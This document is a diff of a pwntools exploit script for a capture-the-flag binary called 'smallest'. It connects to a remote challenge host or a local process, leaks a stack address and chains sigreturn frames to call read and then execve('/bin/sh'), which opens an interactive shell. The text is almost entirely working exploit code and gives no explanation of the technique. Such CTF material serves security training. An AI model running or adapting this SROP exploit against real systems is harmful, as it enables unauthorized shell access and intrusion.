@@ -6,12 +6,11 @@ g_fname = "./smallest"
 def debug_on():
 	context.log_level = "debug"
 
-if args["REMOTE"]:
-	g_io = remote("node3.buuoj.cn", 28731)
+if args.REMOTE:
+	g_io = remote(args.HOST,int(args.PORT))
 else:
 	g_io = process(g_fname)
-#	gdb.attach(g_io)
-#	pause()
+
 def getpid():
 	if args["REMOTE"] == "":
 		print("PID:%d", g_io.proc.pid)
@@ -30,40 +29,45 @@ def pwn():
 	g_io.send(b'\xb3')
 
 	# 3rd. ret to syscall(__NR_write, 1, $rsp, 0x400)
-	stack_addr = u64(g_io.recv()[8:16]) & 0xfffffffffffff000
+	if args.REMOTE:
+		g_io.recv(0x178)
+	else:
+		g_io.recv(8)
+	stack_addr = (u64(g_io.recv(8)) - 0x1000) & 0xfffffffffffff000
 	log.success("stack addr = %#x", stack_addr)
 
-	# 4th. ret to start. read sigreturn-frame
-	sf = SigreturnFrame()
-	## read(0, stack_addr, 0x400)
-	sf.rax = int(constants.SYS_read)
-	sf.rdi = 0
-	sf.rsi = stack_addr
-	sf.rdx = 0x400
-	sf.rsp = stack_addr + 0x120
-	sf.rip = sys_ret_addr
-	payload = flat([start_addr, 'a'*8, sf])
-	g_io.send(payload)
+	# construct sigcontext: read(0, stack_addr, 0x400)
+	sfm = SigreturnFrame()
+	sfm.rax = int(constants.SYS_read)
+	sfm.rdi = 0
+	sfm.rsi = stack_addr
+	sfm.rdx = 0x400
+	sfm.rip = sys_ret_addr # Anywhere is ok, execve() should not return.
+	sfm.rsp = stack_addr + 0x200
 
-	# 5th. make rax=15, sys_sigreturn
-	payload_sigret = p64(sys_ret_addr) + b'b'*7
-	g_io.send(payload_sigret)
+	payload_read = flat([start_addr, 0xdeadbeef, sfm])
+	payload_ret_sigreturn = flat([sys_ret_addr, 'a'*7])
+	pause()	
+	g_io.send(payload_read)
+	pause()
+	g_io.send(payload_ret_sigreturn)
 
-	# 6th. read(0, stack_addr+0x120, 0x400) <- "/bin/sh"
-	sf = SigreturnFrame()
-	sf.rax = int(constants.SYS_execve)
-	sf.rsp = stack_addr + 0x120
-	sf.rdi = stack_addr
-	sf.rsi = sf.rdx = 0
-	sf.rip = sys_ret_addr
-	g_io.send(flat(["/bin/sh\x00".ljust(0x120), start_addr, 0xdeadbeef , sf]))
+	# construct sigcontext: execve("/bin/sh", 0, 0)
+	sfm = SigreturnFrame()
+	sfm.rax = int(constants.SYS_execve)
+	sfm.rdi = stack_addr # "/bin/sh\0"
+	sfm.rsi = sfm.rdx = 0
+	sfm.rip = sys_ret_addr
+	sfm.rsp = stack_addr + 0x200 # Anywhere is ok.
 
-	# 7th. make rax=15, ret to syscall
-	g_io.send(payload_sigret)
+	payload_exec = flat(["/bin/sh\0".ljust(0x200), start_addr, 0xdeadbeef, sfm])
+	pause()
+	g_io.send(payload_exec)
+	pause()
+	g_io.send(payload_ret_sigreturn)
 
 
 if "__main__" == __name__:
-	if (args.DEBUG):
-		debug_on()
 	pwn()
 	g_io.interactive()
+	
